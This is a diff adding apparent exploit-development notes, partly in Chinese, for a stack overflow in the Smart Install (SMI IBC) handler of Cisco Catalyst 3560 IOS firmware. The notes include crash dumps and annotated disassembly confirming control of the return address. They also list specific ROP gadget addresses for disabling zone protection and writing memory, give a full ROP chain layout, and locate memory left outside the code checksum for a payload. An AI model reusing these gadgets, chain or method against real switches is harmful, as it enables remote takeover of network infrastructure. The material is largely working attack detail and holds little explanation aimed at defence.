@@ -1,0 +1,375 @@
+固件：c3560-ipbasek9-mz.122-55.SE5.bin
+
+ 199 Mwe  235CFF8           0         2       0  4624/6000    0 SMI IBC server p
+ 200 Mwe  26A9F28           0         1       0 10804/12000   0 SMI IBC client p
+ 201 Mwe  26AB4EC           0         2       0 11256/12000   0 SMI IBC Download
+
+
+
+      Start         End     Size(b)  Class  Media  Name
+ 0x00000000  0x07FFFFFF   134217728  Local  R/W    main
+ 0x00000020  0x07FFFFFF   134217696  Local  R/W    main:coredump
+ 0x01000000  0x02B31A27    28514856  IText  R/W    coredump:text
+ 0x02C00000  0x02CFFFFF     1048576  IText  R/W    coredump:dltext
+ 0x02D00000  0x035E832B     9339692  IData  R/W    coredump:data
+ 0x032ED02C  0x0332D02B      262144  Local  R/W    data:reclaimed_heap
+ 0x035E832C  0x03D9F68B     8090464  IBss   R/W    coredump:bss
+ 0x03D9F690  0x067FFFFF    44435824  Local  R/W    coredump:heap
+ 0x06800000  0x06FFFFFF     8388608  Iomem  R/W    coredump:iomem
+
+
+Free Region Manager:
+
+      Start         End     Size(b)  Class  Media  Name
+ 0x00003054  0x00FFFFFF    16764844  Local  R/W    heap
+ 0x07000054  0x07FFDFFF    16768940  Local  R/W    heap
+
+c3560#sh memory processor | Include IBC
+03DC4790 0000004608 03DC2054 03DC59BC 001  -------- -------- 026AB4A4  SMI IBC Download Chunk
+0408B7BC 0000000100 0408B6E4 0408B84C 001  -------- -------- 02367F78  SMI IBC server process
+0408C588 0000000296 0408B944 0408C6DC 001  -------- -------- 026CB91C  SMI IBC backup info msg
+0408C6DC 0000000296 0408C588 0408C830 001  -------- -------- 026CB96C  SMI IBC synch info msg
+0408DCBC 0000000136 0408DBE4 0408DD70 001  -------- -------- 02361C10  SMI IBC server process
+0408DD70 0000000152 0408DCBC 0408DE34 001  -------- -------- 026A9C98  SMI IBC version msg
+0408DE34 0000000056 0408DD70 0408DE98 001  -------- -------- 026B3218  SMI IBC client process
+0408DE98 0000000024 0408DE34 0408DEDC 001  -------- -------- 026B3230  SMI IBC client process
+052C33C8 0000000168 052C3384 052C349C 001  -------- -------- 0236442C  SMI IBC server process
+052C349C 0000001656 052C33C8 052C3B40 001  -------- -------- 02361B44  SMI IBC server process
+
+
+------------- bof 
+Debug Exception (Could be NULL pointer dereference) Exception (0x2000)!
+SRR0 = 0x028975AC  SRR1 = 0x00029230  SRR2 = 0x01B9E598  SRR3 = 0x00029230
+ESR = 0x00000000  DEAR = 0x00000000  TSR = 0x84000000  DBSR = 0x10000000
+
+CPU Register Context:
+Vector = 0x00002000  PC = 0x01B9E598  MSR = 0x00029230  CR = 0x22000048
+LR = 0x01B9E598  CTR = 0x0186F1E0  XER = 0x20000079
+R0 = 0x01B9E598  R1 = 0x05169EFC  R2 = 0x00000000  R3 = 0x00000000
+R4 = 0x028975AC  R5 = 0x00029230  R6 = 0x00029230  R7 = 0xBEEFCAFE
+R8 = 0x00000000  R9 = 0x03A30000  R10 = 0x03962690  R11 = 0x03962300
+R12 = 0x00090E86  R13 = 0x00110000  R14 = 0x026ABD70  R15 = 0x0516A0D0
+R16 = 0x0516A050  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x0516A050
+R20 = 0x0516A050  R21 = 0x00000001  R22 = 0x0516A050  R23 = 0x0516A0D0
+R24 = 0x00000001  R25 = 0x00000000  R26 = 0x053C6044  R27 = 0x051075B0
+R28 = 0x053699F4  R29 = 0x00000000  R30 = 0x00000000  R31 = 0x00000003
+
+Stack trace:
+PC = 0x01B9E598, SP = 0x05169EFC
+Frame 00: SP = 0x05169F0C    PC = 0x01B9E598
+Frame 01: SP = 0x05169F1C    PC = 0x01B963EC
+Frame 02: SP = 0x05169F34    PC = 0x01BA1290 *
+Frame 03: SP = 0x05169F80    PC = 0x01B94A0C
+Frame 04: SP = 0x05169FD8    PC = 0x053699F4
+Frame 05: SP = 0x42424242    PC = 0x42424242
+
+
+c3560 uptime is 10 minutes, 16 seconds
+
+cisco WS-C3560-48TS (PowerPC405) processor (revision E0) with 131072K bytes of memory.
+Processor board ID FDO1205Z5EX
+
+-----------
+
+01f23f28 start memcpy
+026BD7C4 
+ROM:026BD7C4 94 21 FF A8                             stwu      r1, -0x58(r1)
+ROM:026BD7C8 7C 08 02 A6                             mflr      r0
+ROM:026BD7CC BF 41 00 40                             stmw      r26, 0x58+var_18(r1)
+ROM:026BD7D0 90 01 00 5C                             stw       r0, 0x58+arg_4(r1)
+ROM:026BD7D4 7C 7B 1B 78                             mr        r27, r3    r3 == 5069d90 => 00 00 00 01 ac 10 01 02 05 12 92 64 05 35 fa 68
+ROM:026BD7D8 7C 9E 23 78                             mr        r30, r4    r4 == 0xd8
+ROM:026BD7DC 7C BA 2B 78                             mr        r26, r5    r5 == 535fa68 => 00 00 00 01 00 00 00 01 00 00 00 07 00 00 00 d8
+ROM:026BD7E0 7C DC 33 78                             mr        r28, r6    r6 == 45c5f08 => 00 00 00 01 00 00 00 d8 41 41 41 41 41 41 41 41 ... packet???
+ROM:026BD7E4 3B A0 00 00                             li        r29, 0
+ROM:026BD7E8 3B E1 00 30                             addi      r31, r1, 0x58+var_28
+
+ROM:026BD7EC 2F 9E 00 00                             cmpwi     cr7, r30, 0    r30 == 7 
+#明显不等于，这里不会跳转，这里是恶意包中这里指定，包类型
+#hdr += '\x00\x00\x00\x07'                                   # msg_hdr_type
+ROM:026BD7F0 41 BE 00 B0                             beq+      cr7, all_data_processed
+#不跳转all_data_processed，继续执行下面代码
+ROM:026BD7F4                         check_tlv_type:
+ROM:026BD7F4 38 61 00 30                             addi      r3, r1, 0x58+var_28 #执行完后 r3 == 50cc7e8 => 00 00 00 01 05 12 91 10 05 0c c8 00 02 6b 1d dc
+ROM:026BD7F8 7F 84 E3 78                             mr        r4, r28 #r4 来源为上面的参数r6 == 45c5f08 => 数据包
+ROM:026BD7FC 38 A0 00 04                             li        r5, 4   #size
+ROM:026BD800 48 44 2B 41                             bl        __libc_memcpy  #将第一个dword拷贝到栈上 __libc_memcpy == 26bd804
+ROM:026BD804 80 01 00 30                             lwz       r0, 0x58+var_28(r1)
+ROM:026BD808 2F 80 00 01                             cmpwi     cr7, r0, 1   r0 == 0xffffff27
+ROM:026BD80C 40 9E 00 30                             bne       cr7, loc_26BD83C 
+#有时候同样的包无法进入跳转跳转
+# r0 == 0xffffff27 
+#未进入下面的复制BOF的代码，原因不明
+
+ROM:026BD810 38 7F 00 04                             addi      r3, r31, 4  r3 => 05 06 9d 90 05 0c c8 00 02 6b 1d dc 00 00 00 01
+ROM:026BD814 38 9C 00 04                             addi      r4, r28, 4  r4 => 00 00 00 d8 41 41 41 41 41 41 41 41 41 41 41 41
+ROM:026BD818 38 A0 00 04                             li        r5, 4
+ROM:026BD81C 48 44 2B 25                             bl        __libc_memcpy #拷贝数据包中的长度字段0xd8
+ROM:026BD820 80 BF 00 04                             lwz       r5, 4(r31)
+ROM:026BD824 2F 85 00 00                             cmpwi     cr7, r5, 0 #r5 => 00 00 00 01 ac 10 01 02 04 61 f5 e4 04 61 f7 30
+ROM:026BD828 41 BE 00 64                             beq+      cr7, loc_26BD88C
+
+ROM:026BD82C                         __bof_point: 
+# 开始进行复制，这里出现了栈溢出
+# 从这里可以看出，我标记的__libc_memcpy 更可能是接收多个参数的拷贝函数，而非真正的libc memcpy
+# 这里不做具体分析
+ROM:026BD82C 38 61 00 10                             addi      r3, r1, 0x58+var_48  #r3 == $sp + 0x10 == 50cc7b8 ==> 04 34 7c 50 00 00 00 01 05 06 9d 90 04 61 f7 30
+ROM:026BD830 38 9C 00 08                             addi      r4, r28, 8 #r28 => 00 00 00 01 00 00 00 d8 41 41 41 41 41 41 41 41, r4 = r28 + 8 正好指向包区
+ROM:026BD834 48 44 2B 0D                             bl        __libc_memcpy #拷贝！！！！！！！！
+# 下面是拷贝过后的堆栈
+> i s
+- - - - - stack at 0x050cc7b8 - - - - -
+$sp + 00 : 0x050cc7c0
+$sp + 04 : 0x04348334
+$sp + 08 : 0x050cc7d8
+$sp + 0c : 0x026b4470
+$sp + 10 : 0x41414141
+$sp + 14 : 0x41414141
+$sp + 18 : 0x41414141
+$sp + 1c : 0x41414141
+$sp + 20 : 0x41414141
+$sp + 24 : 0x41414141
+$sp + 28 : 0x41414141
+$sp + 2c : 0x41414141
+$sp + 30 : 0x41414141
+$sp + 34 : 0x000008d8
+$sp + 38 : 0x42424242
+$sp + 3c : 0x42424242
+
+ROM:026BD838 48 00 00 54                             b         loc_26BD88C
+
+--- 。。。
+流程跳转回check_tlv_type
+ROM:026BD804 80 01 00 30                             lwz       r0, 0x58+var_28(r1)
+# r0 == $sp + 0x30 == 41414141
+# $sp + 28 : 0x41414141
+# $sp + 2c : 0x41414141
+# $sp + 30 : 0x41414141
+# $sp + 34 : 0x000008d8
+
+ROM:026BD808 2F 80 00 01                             cmpwi     cr7, r0, 1   r0 == 0x41414141
+ROM:026BD80C 40 9E 00 30                             bne       cr7, loc_26BD83C 
+#此时r0 = 41414141
+# 他不跳转可以进入最简流程到达函数末尾
+
+----- 
+ROM:026BDB00                         loc_26BDB00:                            # CODE XREF: smi_ibc_handle_ibd_init_discovery_msg+C4j
+ROM:026BDB00                                                                 # smi_ibc_handle_ibd_init_discovery_msg+180j ...
+ROM:026BDB00 80 01 00 5C                             lwz       r0, 0x58+arg_4(r1)   从sp+0x5c 载入r0
+ROM:026BDB04 7C 08 03 A6                             mtlr      r0
+ROM:026BDB08 BB 41 00 40                             lmw       r26, 0x58+var_18(r1) 从sp+0x40 加载dword到r26 - r31
+ROM:026BDB0C 38 21 00 58                             addi      r1, r1, 0x58
+ROM:026BDB10 4E 80 00 20                             blr
+
+blr 执行前
+> i r
+      r0    42424242       sp    050cc7b8       r2    00000000       r3    050cc770
+      r4    045e6354       r5    00000000       r6    045e634c       r7    00000000
+      r8    000000d8       r9    00000000      r10    050cc770      r11    00000036
+     r12    42000042      r13    00110000      r14    026abd70      r15    050cc8b0
+     r16    050cc830      r17    00000000      r18    00000000      r19    050cc830
+     r20    050cc830      r21    00000001      r22    050cc830      r23    050cc8b0
+     r24    00000001      r25    00000000      r26    42424242      r27    42424242
+     r28    42424242      r29    42424242      r30    42424242      r31    42424242
+      pc    026bdb10      msr    00001230       cr    22000042       lr    42424242
+
+- - - - - stack at 0x050cc7b8 - - - - -
+$sp + 00 : 0x42424242
+$sp + 04 : 0x42424242
+$sp + 08 : 0x42424242
+$sp + 0c : 0x42424242
+$sp + 10 : 0x42424242
+$sp + 14 : 0x42424242
+$sp + 18 : 0x42424242
+$sp + 1c : 0x42424242
+$sp + 20 : 0x42424242
+$sp + 24 : 0x42424242
+$sp + 28 : 0x42424242
+$sp + 2c : 0x42424242
+$sp + 30 : 0x42424242
+$sp + 34 : 0x42424242
+$sp + 38 : 0x42424242
+$sp + 3c : 0x42424242
+
+x 050cc794 200
+00 00 08 d8 42 42 42 42 42 42 42 42 42 42 42 42         ....BBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42         BBBBBBBBBBBBBBBB
+42 42 42 42 42 42 42 42 42 42 42 42 fd 01 10 df         BBBBBBBBBBBB....
+ab 12 34 cd 00 00 00 00 00 00 00 00 00 00 00 00         ..4.............
+00 00 00 00 00 00 00 00  
+                               ........
+b 026BD7C4
+b 026BD88C
+走两步
+si 26BD88C
+会到函数末尾 026BDB00
+#== rop 部分
+zpr 操作指令呈现区别
+capstone: mtspr   0x3b0, r0
+ida 7C 10 EB A6   mtspr     zpr, r0 # zone protection register         (403GC)
+
+capstone: sync 0
+ida: sync
+
+操作ZPR的gadgets
+opcode_list = ['mtspr 0x3b0, r0', 'sync 0', 'isync', 'mtmsr r11', 'blr']
+0x017bc96c
+[u'mtspr 0x3b0, r0', u'sync 0', u'isync', u'mtmsr r11', u'blr']
+ROM:017BC950 7D 60 00 A6                             mfmsr     r11
+ROM:017BC954 55 60 04 5E                             rlwinm    r0, r11, 0,17,15
+ROM:017BC958 7C 00 01 24                             mtmsr     r0
+ROM:017BC95C 7C 00 04 AC                             sync
+ROM:017BC960 4C 00 01 2C                             isync
+ROM:017BC964 3D 20 03 3C                             lis       r9, 0x33C    #r9 = 033c0000
+ROM:017BC968 80 09 A4 88                             lwz       r0, -0x5B78(r9)
+# > x 33ba488
+# 55 55 55 55 06 80 00 00 02 d0 00 00 03 b0 00 00         UUUU............
+
+ROM:017BC96C 7C 10 EB A6                             mtspr     zpr, r0 # zone protection register         (403GC)
+ROM:017BC970 7C 00 04 AC                             sync
+ROM:017BC974 4C 00 01 2C                             isync
+ROM:017BC978 7D 60 01 24                             mtmsr     r11
+ROM:017BC97C 4E 80 00 20                             blr
+
+0x017bcb0c
+[u'mtspr 0x3b0, r0', u'sync 0', u'isync', u'mtmsr r11', u'blr']
+
+0x017bd120
+[u'mtspr 0x3b0, r0', u'sync 0', u'isync', u'mtmsr r11', u'blr']
+
+---write 4 dagets r31 = dest, r30 = src
+0x01cadd4c
+[u'stw r30, 0x18(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01d8bb60
+[u'stw r30, 0x14(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01d8bc28
+[u'stw r30, 0x18(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01dba5ec
+[u'stw r30, 0x14(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01dd3164
+[u'stw r30, 0(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01faeac8
+[u'stw r30, 0(r31)', u'lwz r0, 0x2c(r1)', u'mtlr r0', u'lmw r27, 0x14(r1)', u'addi r1, r1, 0x28', u'blr']
+
+---write-4 setter
+[u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x01176d6c
+[u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x0117da00
+[u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x0117dbbc
+[u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
+
+0x011818c0
+[u'lwz r0, 0x24(r1)', u'mtlr r0', u'lwz r30, 0x18(r1)', u'lwz r31, 0x1c(r1)', u'addi r1, r1, 0x20', u'blr']
+
+0x0118505c
+[u'lwz r0, 0x8ac(r1)', u'mtlr r0', u'lwz r30, 0x8a0(r1)', u'lwz r31, 0x8a4(r1)', u'addi r1, r1, 0x8a8', u'blr']
+--- multi task
+ROM:02AE13E4                         loc_2AE13E4:                            # CODE XREF: sub_2AE136C+6Cj
+ROM:02AE13E4 83 BD 00 10                             lwz       r29, 0x10(r29)
+ROM:02AE13E8 7F A9 03 A6                             mtctr     r29
+ROM:02AE13EC 4E 80 04 21                             bctrl
+ROM:02AE13F0 7F 88 03 A6                             mtlr      r28
+ROM:02AE13F4 4E 80 00 21                             blrl
+ROM:02AE13F8 80 01 00 1C                             lwz       r0, 0x18+arg_4(r1)
+ROM:02AE13FC 7C 08 03 A6                             mtlr      r0
+ROM:02AE1400 83 81 00 08                             lwz       r28, 0x18+var_10(r1)
+ROM:02AE1404 83 A1 00 0C                             lwz       r29, 0x18+var_C(r1)
+ROM:02AE1408 83 C1 00 10                             lwz       r30, 0x18+var_8(r1)
+ROM:02AE140C 83 E1 00 14                             lwz       r31, 0x18+var_4(r1)
+ROM:02AE1410 38 21 00 18                             addi      r1, r1, 0x18
+ROM:02AE1414 4E 80 00 20                             blr
+
+======= rop chain =======
+$sp + 00 : 0x42424242  #sp1
+$sp + 04 : 0x0117dbbc  => [u'lwz r0, 0x14(r1)', u'mtlr r0', u'lwz r30, 8(r1)', u'lwz r31, 0xc(r1)', u'addi r1, r1, 0x10', u'blr']
+$sp + 08 : 0xffffffff  => value for zpr
+$sp + 0c : 0x00000000  => addr for zpr
+$sp + 10 : 0x42424242  #sp2
+$sp + 14 : 0x01dd3164  => [u'stw r30, 0(r31)', u'lwz r0, 0x14(r1)', u'mtlr r0', u'lmw r30, 8(r1)', u'addi r1, r1, 0x10', u'blr']
+$sp + 18 : 0x42424242
+$sp + 1c : 0x42424242
+$sp + 20 : 0x42424242  #sp3
+$sp + 24 : 0x017BC950  => dep disable
+$sp + 28 : 0x42424242
+$sp + 2c : 0x42424242
+$sp + 30 : 0x42424242  #sp4
+$sp + 34 : 0x90909090  => ret
+$sp + 38 : 0x42424242
+$sp + 3c : 0x42424242
+$sp + 40 : 0x42424242
+$sp + 44 : 0x42424242
+$sp + 48 : 0x42424242
+$sp + 4c : 0x42424242
+$sp + 50 : 0x42424242
+$sp + 54 : 0x42424242
+$sp + 58 : 0x42424242
+$sp + 5c : 0x42424242
+$sp + 60 : 0x42424242
+$sp + 64 : 0x42424242
+$sp + 68 : 0x42424242
+$sp + 6c : 0x42424242
+$sp + 70 : 0x42424242
+$sp + 74 : 0x42424242
+$sp + 78 : 0x42424242
+$sp + 7c : 0x42424242
+$sp + 80 : 0x42424242
+$sp + 84 : 0x42424242
+$sp + 88 : 0xfd0110df
+$sp + 8c : 0xab1234cd
+
+=== 查找代码拷贝并对抗cash的函数ios_move_handlers(src, dsc, size)
+Searching down CASE-INSENSITIVELY for binary pattern: 7C 00 20 AC
+Search completed. Found at 0000000001B94C94.
+
+ROM:01B94C7C                         ios_move_handler:                       # CODE XREF: sub_1BA06A8+34p
+ROM:01B94C7C 38 63 FF FC                             addi      r3, r3, -4
+ROM:01B94C80 38 84 FF FC                             addi      r4, r4, -4
+ROM:01B94C84 2C 05 00 00                             cmpwi     r5, 0
+ROM:01B94C88 40 81 00 20                             ble       locret_1B94CA8
+
+=== 查找checksum函数确定没有被代码校验和的内存区域
+python ppc32_rop_helper.py
+0x01ba15cc
+[u'lis r9, 0x100', u'addi r9, r9, 0', u'li r3, 0', u'lis r11, 0x2b3']
+__checksum:
+lis       r9, loc_1000000@h
+addi      r9, r9, loc_1000000@l
+li        r3, 0
+lis       r11, 0x2B3 # 0x2B31A28
+addi      r11, r11, 0x1A28 # 0x2B31A28
+
+计算的区域 0x01000000 - 0x02B31A28
+
+ 0x00000000  0x07FFFFFF   134217728  Local  R/W    main
+ 0x00000020  0x07FFFFFF   134217696  Local  R/W    main:coredump
+ 0x01000000  0x02B31A27    28514856  IText  R/W    coredump:text
+ 0x02C00000  0x02CFFFFF     1048576  IText  R/W    coredump:dltext
+ 0x02D00000  0x035E832B     9339692  IData  R/W    coredump:data
+ 0x032ED02C  0x0332D02B      262144  Local  R/W    data:reclaimed_heap
+ 0x035E832C  0x03D9F68B     8090464  IBss   R/W    coredump:bss
+ 0x03D9F690  0x067FFFFF    44435824  Local  R/W    coredump:heap
+ 0x06800000  0x06FFFFFF     8388608  Iomem  R/W    coredump:iomem
+
+找到三不管区域 0x02C00000 - 02B31A28 = 0xCE5D8 = 8452722
+
+
+
+
